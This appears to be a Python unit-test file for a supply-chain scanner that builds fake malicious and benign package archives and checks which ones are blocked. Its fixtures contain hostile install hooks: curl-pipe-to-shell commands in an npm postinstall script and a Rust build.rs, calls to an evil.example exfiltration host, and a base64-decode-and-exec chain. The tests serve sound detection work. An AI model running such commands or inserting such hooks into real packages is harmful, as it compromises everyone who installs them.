import io
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

from depshieldx.artifact_analysis import analyze_artifacts


class ArtifactAnalysisTests(unittest.TestCase):
    @staticmethod
    def _elf_binary(*parts: bytes) -> bytes:
        return b"\x7fELF" + b"\x00" * 64 + b"\x00".join(parts)

    @staticmethod
    def _pe_binary(*parts: bytes) -> bytes:
        data = bytearray(b"MZ" + b"\x00" * 0x80)
        data[0x3C:0x40] = (0x40).to_bytes(4, "little")
        data[0x40:0x44] = b"PE\x00\x00"
        for part in parts:
            data.extend(b"\x00")
            data.extend(part)
        return bytes(data)

    def test_high_severity_install_hook_blocks_artifact(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "badpkg-0.1.0.tar.gz"
            with tarfile.open(artifact, "w:gz") as archive:
                data = b"import requests\nrequests.get('https://evil.example')\n"
                info = tarfile.TarInfo("badpkg-0.1.0/setup.py")
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        self.assertEqual(result["high_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "install_network_access")

    def test_medium_severity_payload_chain_is_reported_without_block(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/module.py",
                    "import base64\npayload = base64.b64decode(data)\nexec(payload)\n",
                )

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["medium_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "payload_obfuscation")

    def test_plain_base64_usage_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr("pkg/module.py", "import base64\nvalue = base64.b64decode(data)\n")

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_generic_secret_key_access_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr("pkg/config.py", "import os\nsecret = os.getenv('SECRET_KEY')\n")

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_explicit_high_risk_credential_env_access_is_flagged(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr("pkg/creds.py", "import os\nkey = os.getenv('AWS_SECRET_ACCESS_KEY')\n")

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["medium_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "sensitive_env_access")

    def test_native_extension_network_and_exec_combo_blocks_artifact(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.so",
                    self._elf_binary(
                        b"socket",
                        b"connect",
                        b"execve",
                        b"/bin/sh",
                        b"https://evil.example/payload",
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        finding_codes = [finding["code"] for finding in result["findings"]]
        self.assertIn("binary_network_exec_combo", finding_codes)
        self.assertIn("binary_embedded_urls", finding_codes)

    def test_native_extension_symbol_only_network_and_exec_combo_is_medium(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.so",
                    self._elf_binary(
                        b"socket",
                        b"connect",
                        b"execve",
                        b"posix_spawn",
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["medium_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "binary_network_exec_symbols")

    def test_standalone_native_binary_with_embedded_archive_blocks(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "payload.pyd"
            artifact.write_bytes(
                self._elf_binary(
                    b"PyInit_payload",
                    b"benign-symbol",
                )
                + b"\x00" * 32
                + b"PK\x03\x04"
                + b"\x00" * 16
            )

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        self.assertEqual(result["high_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "binary_embedded_payload")

    def test_native_binary_loader_with_encoded_blob_is_medium_only(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.dylib",
                    self._elf_binary(
                        b"dlopen",
                        b"LoadLibraryA",
                        b"A" * 192,
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["medium_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "binary_encoded_loader")

    def test_benign_native_extension_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.so",
                    self._elf_binary(
                        b"PyInit_pkg",
                        b"PyExc_ImportError",
                        b"libpython3.11.so",
                        b"memcpy",
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_benign_pe_extension_with_incidental_zip_magic_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.pyd",
                    self._pe_binary(
                        b"PyInit_pkg",
                        b"python312.dll",
                        b"PK\x03\x04",
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_malicious_npm_postinstall_script_blocks_artifact(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "evil-pkg-1.0.0.tgz"
            with tarfile.open(artifact, "w:gz") as archive:
                manifest = (
                    '{"name": "evil-pkg", "version": "1.0.0", '
                    '"scripts": {"postinstall": "node -e \\"require(\'child_process\').exec('
                    '\'curl http://evil.example/payload.sh | sh\')\\""}}'
                ).encode("utf-8")
                info = tarfile.TarInfo("package/package.json")
                info.size = len(manifest)
                archive.addfile(info, io.BytesIO(manifest))

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        finding_codes = [finding["code"] for finding in result["findings"]]
        self.assertIn("install_subprocess_js", finding_codes)

    def test_plain_js_file_network_call_is_not_flagged_as_install_script(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.tgz"
            with tarfile.open(artifact, "w:gz") as archive:
                data = b"const res = await fetch('https://example.com');\n"
                info = tarfile.TarInfo("package/index.js")
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_malicious_cargo_build_script_blocks_artifact(self):
        # .crate files are confirmed plain gzipped tarballs -- same handling
        # as .tgz/.tar. build.rs is cargo's "install_only" analogue to
        # setup.py/package.json: always executed automatically at build
        # time, before the crate itself compiles.
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "evilcrate-1.0.0.crate"
            with tarfile.open(artifact, "w:gz") as archive:
                data = (
                    b'use std::process::Command;\n'
                    b'fn main() {\n'
                    b'    Command::new("sh").arg("-c").arg("curl http://evil.example/x | sh").output().unwrap();\n'
                    b'    reqwest::blocking::get("http://evil.example/exfil").unwrap();\n'
                    b'}\n'
                )
                info = tarfile.TarInfo("evilcrate-1.0.0/build.rs")
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        finding_codes = [finding["code"] for finding in result["findings"]]
        self.assertIn("install_subprocess_rust", finding_codes)
        self.assertIn("install_network_access_rust", finding_codes)

    def test_rustc_version_probe_in_build_rs_is_not_flagged(self):
        # Regression test: reproduced directly against the real, live
        # serde@1.0.219 crate that a blanket `Command::new(` pattern
        # false-positive-blocked it -- serde's real build.rs shells out to
        # `Command::new(rustc).arg("--version")` to feature-gate on the
        # compiler version, an extremely common, benign build.rs idiom
        # (the exact same probe sandbox_wrapper.py's own
        # ALLOWED_SUBPROCESS_PREFIXES already allowlists for PyPI/npm).
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "serde-1.0.219.crate"
            with tarfile.open(artifact, "w:gz") as archive:
                data = (
                    b'use std::env;\n'
                    b'use std::process::Command;\n'
                    b'fn rustc_minor_version() -> Option<u32> {\n'
                    b'    let rustc = env::var_os("RUSTC")?;\n'
                    b'    let output = Command::new(rustc).arg("--version").output().ok()?;\n'
                    b'    None\n'
                    b'}\n'
                )
                info = tarfile.TarInfo("serde-1.0.219/build.rs")
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_plain_rust_file_network_call_is_not_flagged_as_install_script(self):
        # Mirrors the plain-.js-file case above -- only build.rs specifically
        # is install_only, not arbitrary .rs source a crate happens to ship.
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.crate"
            with tarfile.open(artifact, "w:gz") as archive:
                data = b'pub fn fetch() { reqwest::blocking::get("https://example.com").unwrap(); }\n'
                info = tarfile.TarInfo("pkg-0.1.0/src/lib.rs")
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_pe_extension_with_embedded_second_pe_and_exec_indicators_still_blocks(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.pyd",
                    self._pe_binary(
                        b"PyInit_pkg",
                        b"CreateProcessW",
                        b"cmd.exe",
                        self._pe_binary(b"payload"),
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        self.assertEqual(result["high_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "binary_embedded_payload")
